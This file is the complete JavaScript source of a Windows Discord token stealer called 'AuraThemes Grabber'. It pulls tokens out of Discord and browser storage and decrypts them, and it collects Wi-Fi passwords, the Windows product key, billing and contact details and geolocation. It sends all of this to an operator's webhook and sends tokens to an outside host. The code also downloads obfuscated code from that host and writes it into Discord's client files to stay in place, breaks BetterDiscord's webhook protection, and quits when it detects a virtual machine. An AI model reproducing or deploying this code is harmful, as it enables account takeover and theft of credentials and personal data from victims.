const { execSync, spawnSync, exec } = require("child_process");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const DiscordToken = require("discord.js-token");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const axios = require("axios");
const path = require("path");
const aura = require("win-dpapi");
const buffreplace = require("buffer-replace");

let allTokens = [];
let injectPaths = [];

const killDiscords = "yes"; // yes it is to restart discord
const antivm = "yes"; // Yes it is to activate the anti virtual machine

const webhook = new WebhookClient({
	url: "ADD YOUR WEBHOOK", // Add your webhook here
});

switch (process.platform) {
	case "win32":
		let appdata = process.env.appdata;
		let localappdata = process.env.localappdata;
		let paths = [
			`${appdata}/discord/`,
			`${appdata}/discordcanary/`,
			`${appdata}/discordptb/`,
			`${appdata}/discorddevelopment/`,
			`${appdata}/lightcord/`,
			`${appdata}/Opera Software/Opera Stable/`,
			`${appdata}/Opera Software/Opera GX Stable/`,
			`${localappdata}/Google/Chrome/User Data/Default/`,
			`${localappdata}/Google/Chrome/User Data/Profile 1/`,
			`${localappdata}/Google/Chrome/User Data/Profile 2/`,
			`${localappdata}/Google/Chrome/User Data/Profile 3/`,
			`${localappdata}/Google/Chrome/User Data/Profile 4/`,
			`${localappdata}/Google/Chrome/User Data/Profile 5/`,
			`${localappdata}/Google/Chrome/User Data/Guest Profile/`,
			`${localappdata}/Google/Chrome/User Data/Default/Network/`,
			`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
			`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
			`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
			`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
			`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
			`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Default/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
			`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
			`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
			`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`,
		];
		let cords = [
			"discord",
			"discordcanary",
			"discordptb",
			"discorddevelopment",
			"lightcord",
		];

		if (antivm === "yes") {
			if (isVM()) {
				process.exit(1);
			}
		}

		axios
			.get("https://discord.com")
			.then(() => {
				startup();
			})
			.catch(() => {
				startup();
			});

		function startup() {
			discordInjected();
			sendAll();
			fs.readdirSync(__dirname).forEach((a) => {
				if (a.endsWith(".xml")) {
					fs.unlinkSync(path.join(__dirname, a));
				}
			});
		}

		async function find(p) {
			let tail = p;
			p += "Local Storage/leveldb";
			if (!cords.some((d) => tail.includes(d))) {
				try {
					fs.readdirSync(p).map((f) => {
						(f.endsWith(".log") || f.endsWith(".ldb")) && fs.readFileSync(`${p}/${f}`, "utf8").split(/\r?\n/).forEach((l) => {
							const patterns = [
								new RegExp(/mfa\.[\w-]{84}/g),
								new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
							];
							for (const p of patterns) {
								const foundTokens = l.match(p);
								if (foundTokens) {
									foundTokens.forEach((tkn) => {
										if (!allTokens.includes(tkn))
											return allTokens.push(tkn);
									});
								}
							}
						});
					});
				} catch { }
				return;
			} else {
				if (fs.existsSync(`${tail}/Local State`)) {
					try {
						fs.readdirSync(p).map((f) => {
							(f.endsWith(".log") || f.endsWith(".ldb")) && fs.readFileSync(`${p}/${f}`, "utf8").split(/\r?\n/).forEach((l) => {
								const pattern = new RegExp(
									/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g,
								);
								const foundTokens = l.match(pattern);
								if (foundTokens) {
									foundTokens.forEach((tkn) => {
										let enc = Buffer.from(
											JSON.parse(fs.readFileSync(`${tail}/Local State`))
												.os_crypt.encrypted_key,
											"base64",
										).slice(5);
										let key = aura.unprotectData(
											Buffer.from(enc, "utf-8"),
											null,
											"CurrentUser",
										);
										const tkns = Buffer.from(
											tkn.split("dQw4w9WgXcQ:")[1],
											"base64",
										);
										let run = tkns.slice(3, 15),
											mid = tkns.slice(15, tkns.length - 16);
										let decyph = crypto.createDecipheriv(
											"aes-256-gcm",
											key,
											run,
										);
										decyph.setAuthTag(
											tkns.slice(tkns.length - 16, tkns.length),
										);
										let out =
											decyph.update(mid, "base64", "utf-8") +
											decyph.final("utf-8");
										if (!allTokens.includes(out))
											return allTokens.push(out);
									});
								}
							});
						});
					} catch { }
					return;
				}
			}
		}

		function getField(a = null, b = null, c = false) {
			let name = a;
			let value = b;
			let inline = c;
			if (!name || name.length < 1) name = `-`;
			if (!value || value.length < 1) value = `-`;
			return {
				name,
				value,
				inline,
			};
		}

		async function getServers(a) {
			let res = await axios.get(
				"https://discord.com/api/v9/users/@me/guilds?with_counts=true",
				{
					headers: {
						Authorization: a,
					},
				},
			);
			let servers = res.data
				.filter((server) => server.owner || (server.permissions & 8) === 8)
				.filter((server) => server.approximate_member_count >= 500)
				.map((server) => ({
					id: server.id,
					name: server.name,
					owner: server.owner,
					member_count: server.approximate_member_count,
				}));
			return servers;
		}

		async function sendAll() {
			for (let path of paths) {
				await find(path);
			}
			for (let a of allTokens) {
				let e;
				await axios
					.get(`https://discord.com/api/v9/users/@me`, {
						headers: {
							"Content-Type": "application/json",
							Authorization: a,
						},
					})
					.then((g) => {
						e = g.data;
					})
					.catch(() => {
						e = null;
					});
				if (!e) continue;
				var copy = `https://6889.fun/api/aurathemes/raw?data=${a}`;
				let embed = await getEmbed();
				let pc = getSystemInfo();
				var Discord = new DiscordToken(a, pc.getIpAddress, e.password).info;
				var color = "#c267ff";
				var servers = await getServers(a);
				var Initialized = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setThumbnail(Discord.avatar)
					.setColor(color)
					.setTitle("Initialized Grabber")
					.addFields(getField(`<a:aura:1087044506542674091> Token:`,`\`\`\`${a}\`\`\`\n[[Click Here To Copy Your Token]](${copy})`))
					.addFields(getField(`<a:aura:1101739920319590420> Nitro:`,Discord.nitroType,true))
					.addFields(getField(`<a:aura:995172580988309664> IP Adress`,`\`${pc.getIpAddress}\``,true))
					.addFields(getField(`<a:aura:863691953531125820> Phone`,`\`${e.phone}\``,true))
					.addFields(getField(`<:aura:974711605927505990> Email`,`\`${e.email}\``,false))
					.addFields(getField(`Badges`, Discord.badges, true))
					.addFields(getField(`Billing`, Discord.billing, true))
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				webhook
					.send({
						embeds: [Initialized],
						username: `@AuraThemes`,
						avatarURL: embed.avatar,
					})
					.then((r) => {
						axios.get(copy);
					})
					.catch((c) => {
						axios.get(copy);
					});
				var Friend = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setColor(color)
					.setTitle("HQ Friend(s)")
					.setDescription(Discord.StrangeFriends
						=== "None"
						? `\`\`\`yml\nNot found\`\`\``
						: `**${Discord.StrangeFriends}**`,
					)
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				setTimeout(
					() =>
						webhook.send({
							embeds: [Friend],
							username: `@AuraThemes`,
							avatarURL: embed.avatar,
						}),
					50,
				);
				var Guild = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setColor(color)
					.setTitle("HQ Guild(s)")
					.setDescription(servers.length
						? servers.map((server) => {
							return `**${server.name}** | \`${server.id}\`` +
								`\n**Owner** ${
									server.owner ? "✅" : "❌"
								} | **Members** <:online:970050105338130433> \`${
									server.member_count
								}\``;
							}).join("\n\n")
						: `\`\`\`yml\nNot found\`\`\``,
					)
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				setTimeout(
					() =>
						webhook.send({
							embeds: [Guild],
							username: `@AuraThemes`,
							avatarURL: embed.avatar,
						}),
					50,
				);
				var Information = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setColor(color)
					.setTitle("User Informatio(s)")
					.setDescription(
						`**NSFW** ${Discord.NSFW}\n` +
						`**Status** ${Discord.status}\n` +
						`**Owner Servers** \`${Discord.totalOwnedGuild}\`\n` +
						`**Connection** \`${Discord.totalConnection}\`\n` +
						`**BOTS/RPC** \`${Discord.totalApplication}\`\n` +
						`**Blocked** \`${Discord.totalBlocked}\`\n` +
						`**Servers** \`${Discord.totalGuild}\`\n` +
						`**Friends** \`${Discord.totalFriend}\`\n` +
						`**Theme** \`${Discord.theme}\`\n` +
						`**Pending** \`${Discord.pending}\`\n\n` +
						`**Biography** \`\`\`yml\n${Discord.bio === "has no description" ? "Not found" : Discord.bio
						}\n\`\`\``,
					)
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				setTimeout(
					() =>
						webhook.send({
							embeds: [Information],
							username: `@AuraThemes`,
							avatarURL: embed.avatar,
						}),
					100,
				);
				var Gifts = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setColor(color)
					.setTitle("Gifts Code(s)")
					.addFields(
						...Object.entries(Discord.Gifts).map(([key, value]) => ({
							name: "Code " + key,
							value: typeof value === "object" 
							? `\`\`\`json\n${JSON.stringify(value, null, 2)
									? JSON.stringify(value, null, 2)
									: "None"
								}\n\`\`\``
							: value.toString(),
						})),
					)
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				setTimeout(
					() =>
						webhook.send({
							embeds: [Gifts],
							username: `@AuraThemes`,
							avatarURL: embed.avatar,
						}),
					150,
				);
				var System = new EmbedBuilder()
					.setAuthor({
						name: `${e.username}#${e.discriminator} | ${e.id}`,
						iconURL: Discord.avatar,
					})
					.setColor(color)
					.setTitle("System Informatio(s)")
					.addFields(getField(`Wifi Password(s)`,`\`\`\`yml\n${pc.wifiPasswords ? pc.wifiPasswords : `Not found`}\`\`\``,false))
					.addFields(getField(`User`,`\`\`\`yml\nUsername: ${pc.username}\nHostname: ${os.hostname}\`\`\``,false))
					.addFields(getField(`System`,`\`\`\`yml\nCPU: ${pc.cpuModel}\nUUID: ${pc.UUID}\nRAM: ${pc.ram}\nMac Address: ${pc.macAddress}\nProduct Key: ${pc.productKey}\nLOCAL IP: ${pc.localIp}\nIP Address: ${pc.getIpAddress}\nOS Version: ${pc.os.name + " | " + pc.os.version}\`\`\``,false))
					.addFields(getField(`Network`,`\`\`\`yml\nPUBLIC: ${pc.getIpAddress}\nCountry: ${Discord.IP.country}\nRegion: ${Discord.IP.region}\nCity: ${Discord.IP.city}\nLatitude: ${Discord.IP.latitude}\nLongitude: ${Discord.IP.longitude}\nISP: ${Discord.IP.isp}\nTime Zone: ${Discord.IP.timezone}\nCurrency Code: ${Discord.IP.currency_code}\`\`\``,false))
					.setFooter({
						text: `AuraThemes Grabber - ${embed.url}`,
						iconURL: embed.footericon,
					})
					.setTimestamp();
				setTimeout(
					() =>
						webhook.send({
							embeds: [System],
							username: `@AuraThemes`,
							avatarURL: embed.avatar,
						}),
					200,
				);
				continue;
			}
		}

		function getSystemInfo() {
			try {
				return {
					os: {
						name: execSync("wmic os get caption")
							.toString()
							.trim()
							.split("\n")[1],
						version: execSync("wmic os get version")
							.toString()
							.trim()
							.split("\n")[1],
					},
					ram: Math.round(os.totalmem() / 1024 / 1024 / 1024) + " GB",
					username:
						execSync("echo %USERNAME%").toString().trim() ||
						process.env.SUDO_USER ||
						process.env.C9_USER ||
						process.env.LOGNAME ||
						process.env.USER ||
						process.env.LNAME ||
						process.env.USERNAME,
					UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID")
						.toString()
						.split("\r\n")[0],
					macAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress")
						.toString()
						.split("\r\n")[0],
					productKey: spawnSync("powershell", [
						"Get-ItemPropertyValue",
						"-Path",
						"'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform'",
						"-Name",
						"BackupProductKeyDefault",
					])
						.stdout.toString()
						.trim(),
					localIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress")
						.toString()
						.split("\r\n")[0],
					cpuModel: execSync("wmic cpu get caption")
						.toString()
						.split("\r\r\n")[1]
						.trim(),
					getIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress")
						.toString()
						.split("\r\n")[0],
					wifiPasswords: execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`,{
						shell: "powershell.exe"
					})
						.toString()
						.split("\r\n")
						.filter((l) => l.includes(": "))
						.map((l) => l.replace(/�\?T/g, "'"))
						.join("\n"),
				};
			} catch {
				return {};
			}
		}

		async function discordInjected() {
			const discords = fs
				.readdirSync(localappdata)
				.filter((file) => file.includes("iscord"))
				.map((file) => path.join(localappdata, file));
			for (const paths of discords) {
				findIndex(paths);
			}
			for (const paths of discords) {
				await findInject(paths);
			}
			await inject();
			await betterbroke();
			if (killDiscords === "yes") {
				await killAllDiscord();
			}
		}

		async function getEmbed() {
			const embed = JSON.parse(Buffer.from("eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=", "base64").toString("utf-8"));
			return {
				avatar: embed.avatar_url,
				url: embed.discord,
				footericon: embed.footer_url,
			};
		}

		function findIndex(f) {
			let discordPaths = fs.readdirSync(f);
			discordPaths.forEach((file) => {
				let filePath = path.join(f, file);
				let fileStat = fs.statSync(filePath);
				if (fileStat.isDirectory()) {
					findIndex(filePath);
				} else {
					if (
						file === "index.js" &&
						!f.includes("node_modules") &&
						f.includes("desktop_core")
					) {
						injectPaths.push(filePath);
					}
				}
			});
		}

		async function findInject(f) {
			const files = await fs.promises.readdir(f);
			for (const file of files) {
				const filePath = path.join(f, file);
				const fileStat = await fs.promises.stat(filePath);
				if (fileStat.isDirectory()) {
					if (file === "aura") {
						await fs.rmdirSync(filePath);
					} else {
						await findInject(filePath);
					}
				}
			}
		}

		async function inject() {
			let resp = await axios.get(
				"https://6889.fun/api/aurathemes/injects/f/discord", {
					headers: {
						aurathemes: true,
					},
				},
			);
			let obf = require("javascript-obfuscator").obfuscate(resp.data.replace("%WEBHOOK%", webhook.url), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false },);
			let payload = obf.getObfuscatedCode();
			injectPaths.forEach((file) => {
				try {
					fs.writeFileSync(file, payload, {
						encoding: "utf8",
						flag: "w",
					});
				} catch { }
			});
		}

		function betterbroke() {
			let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
			if (fs.existsSync(dir)) {
				fs.writeFileSync(
					dir,
					buffreplace(fs.readFileSync(dir), "api/webhooks", "aurathemesontop"),
				);
			}
			return;
		}

		async function killAllDiscord() {
			const execx = require("util").promisify(exec);
			const clients = [
				"Discord.exe",
				"DiscordCanary.exe",
				"DiscordDevelopment.exe",
				"DiscordPTB.exe",
			];
			try {
				const { stdout } = await execx("tasklist");
				for (const c of clients) {
					if (stdout.includes(c)) {
						await restartClient(c);
					}
				}
			} catch { }
		}

		async function restartClient(c) {
			try {
				await exec(`taskkill /F /T /IM ${c}`);
				const clientPath = `${localappdata}/${c.replace(
					".exe",
					"",
				)}/Update.exe`;
				await exec(`"${clientPath}" --processStart ${c}`);
			} catch { }
		}

		function isVM() {
			try {
				const uuids = require("./raw/antivm/uuids.json");
				if (
					uuids.includes(execSync("WMIC csproduct get UUID")
						.toString()
						.trim()
						.split("\n")[1],
					)
				) {
					process.exit(1);
				}
				const pcuserblack = require("./raw/antivm/pcuserblack.json");
				if (pcuserblack.includes(os.userInfo().username)) {
					process.exit(1);
				}
				const hostnameblack = require("./raw/antivm/hostnameblack.json");
				if (hostnameblack.includes(os.hostname())) {
					process.exit(1);
				}
			} catch {
				process.exit(1);
			}
		}

		break;
	default:
		break;
}

process
	.on("uncaughtException", (err) => console.error(err))
	.on("unhandledRejection", (err) => console.error(err));
